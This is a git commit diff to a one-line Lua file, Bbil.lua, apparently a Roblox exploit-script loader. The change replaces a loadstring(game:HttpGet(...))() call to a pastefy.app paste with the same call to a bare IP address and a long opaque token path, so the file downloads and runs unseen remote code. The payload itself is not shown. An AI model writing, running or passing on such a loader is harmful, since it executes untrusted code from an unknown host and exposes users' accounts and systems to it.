e00506ae86a64c228e23511868afdd3bcd59d6d7
TakZ-bit <tak72086@gmail.com>
2026-05-18 01:46:22 +0630

    Update Bbil.lua

--- Bbil.lua
+++ Bbil.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/YJCfXFIz/raw"))()
+loadstring(game:HttpGet("http://84.200.89.110/IO9Muh0Aty8c7aFtGzBfPn8Q20b4W60UKCOtm94EKmVPNWexgphBj3nNbIWBptqe4bot2fXtYdCyzipS"))()
